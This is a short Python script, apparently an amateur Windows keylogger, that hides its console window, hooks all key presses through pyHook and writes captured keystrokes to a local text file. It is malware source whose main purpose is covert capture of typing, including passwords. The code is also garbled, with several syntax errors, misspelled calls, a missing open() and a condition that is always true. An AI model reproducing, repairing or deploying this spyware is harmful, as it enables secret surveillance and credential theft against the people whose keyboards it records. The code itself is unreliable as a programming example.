import win32api 
import win32 console
import win32gui 
import pythoncom, pyHook
# import class Libraries

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)
#initialize script for window

#function for Keyboard Event
def OnKeyboardEvent(event):
	#If condition if the event Ascii is equal to 5 , exit
	if event.Ascii == 5 
		_exit(1)
	#if condition if the event Ascii is not equal to 0 or 8, open, read,close output text
	if event.Ascii != 0 or 8:

		f = open('c:\output.txt', 'r+')	#when f is pressed open

		buffer = f.read() #reads text file when opened
		f.close()	#Close the file once user stops typing

		#When starting to type again
		#Open output.txt to write the curent and new keystrokes
		
		f = ('c:\output.txt','w')

		keylogs = chr(event.Ascii)

		if event.Ascii == 13:

		keylogs = '/n'  # new keylogger 

		buffer += keylogs
		f.write(buffer)
		f.close()

	#Create a hook for the manager object 
	#pyHook connects to keyboard itself

	hm - pyHook.Hookmanager()
	hm.KeyDown = OnKeyboardEvent

	#set the hook
	hm.HookKeybaord()

	#Wait forever
	pythoncom.PumpMessage()